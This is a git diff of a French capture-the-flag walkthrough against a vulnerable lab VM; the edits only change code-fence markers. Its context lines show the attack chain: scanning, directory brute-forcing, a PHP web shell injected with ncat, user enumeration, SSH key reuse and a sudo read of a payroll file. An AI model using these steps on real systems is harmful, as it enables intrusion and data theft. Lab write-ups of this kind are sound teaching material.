@@ -12,7 +12,7 @@ Il s'agit d'un live CD *Slax* customisé (ça ne rajeunira personne...)
 
 L'objectif du challenge est de récupérer le *"Payroll"*  
 
-```plain
+```
 Nmap scan report for 192.168.2.120
 Host is up (0.00057s latency).
 Not shown: 65504 closed ports, 28 filtered ports
@@ -38,7 +38,7 @@ Service Info: OS: Unix
 
 Avec un brute-forceur de noms de dossiers et fichiers on trouve rapidement un dossier *logs*.  
 
-```plain
+```
 http://192.168.2.120/cgi-bin/ - HTTP 403 (210 bytes, plain)
 http://192.168.2.120/logs/ - HTTP 403 (207 bytes, plain)
 http://192.168.2.120/index.php - HTTP 200 (1323 bytes, plain)
@@ -52,7 +52,7 @@ Et dans le code source de la page d'index on retrouve des identifiants :
 
 Ces derniers permettent une connexion sur le serveur *ProFTPD* :  
 
-```plain
+```
 -rwxrwxrwx   1 root     root         1450 Jun  8  2012 backup_log.php
 ```
 
@@ -109,7 +109,7 @@ Une fois décompressé on obtient un fichier *media/backup/pxelinux.cfg.tar.gz*
 
 Voici le contenu du dossier *pxelinux.cfg*:  
 
-```plain
+```
 default:    ASCII text
 dnsmasq:    ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, stripped
 pxelinux.0: pxelinux loader
@@ -119,7 +119,7 @@ web:        directory
 
 et du dossier web :  
 
-```plain
+```
 conf:   directory
 monkey: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.16, stripped
 start:  Bourne-Again shell script, ASCII text executable
@@ -147,19 +147,19 @@ ncat -l -p 10000 -v; echo '<?php system($_GET["cmd"]); ?>' | ncat 192.168.2.120 
 
 On a bien évidemment les droits d'Apache :  
 
-```plain
+```
 uid=80(apache) gid=80(apache) groups=80(apache)
 ```
 
 sur un système Linux qui date un peu :p   
 
-```plain
+```
 Linux slax 2.6.27.27 #1 SMP Wed Jul 22 07:27:34 AKDT 2009 i686 Intel(R) Core(TM) i5-7200U CPU @ 2.50GHz GenuineIntel GNU/Linux
 ```
 
 Il y a trois users sur le système (hors root et autres daemons) :  
 
-```plain
+```
 hbeale:x:1001:10:,,,:/home/hbeale:/bin/bash
 jgreen:x:1002:10:,,,:/home/jgreen:/bin/bash
 logs:x:1003:100:,,,:/tmp:/bin/bash
@@ -167,7 +167,7 @@ logs:x:1003:100:,,,:/tmp:/bin/bash
 
 Ces users font partie des groupes suivants :  
 
-```plain
+```
 uid=1002(jgreen) gid=10(wheel) groups=10(wheel)
 uid=1001(hbeale) gid=10(wheel) groups=10(wheel)
 uid=1003(logs) gid=100(users) groups=100(users)
@@ -177,7 +177,7 @@ On ne trouve rien de particulier dans crontab, permissions, exécutables set(u/g
 
 On trouve facilement le fichier *Payroll* mais il n'est pas accessible avec notre user :  
 
-```plain
+```
 -r-------- 1 jgreen users 613 Jun  6  2012 /home/jgreen/.local/share/Trash/files/Payroll
 ```
 
@@ -190,7 +190,7 @@ Les clés sont sous le paillasson
 
 Peut-être faut-il exploiter le processus de génération de l'archive de backup. Jetons un œil à ce qui se trouve dans */media* :  
 
-```plain
+```
 total 0
 drwxrwxrwx  4 root root  80 Jun  6  2012 .
 drwxr-xr-x 93 root root 300 Jan 23 20:12 ..
@@ -225,7 +225,7 @@ Ohoh ! Je n'avais pas encore vu ce dossier *USB\_1* :)
 
 La clé privée SSH permet la connexion en *hbeale* une fois téléchargée et les bons droits (chmod 600) appliqués.  
 
-```plain
+```
 $ ssh -i 21ltr_rsa.key hbeale@192.168.2.120
 Linux 2.6.27.27.
 hbeale@slax:~$ id
@@ -238,7 +238,7 @@ User hbeale may run the following commands on this host:
 
 On peut exécuter cat via sudo et donc obtenir le contenu du fichier *Payroll* sans tricher :  
 
-```plain
+```
 Contractors Name, Monthly Wage, Paid On, Paid From Holding Account, Actual Amount Paid, Margin Taken
 
 Tony Burrows, $4500, 10/03/2012, 16/03/2012, $3900, $600
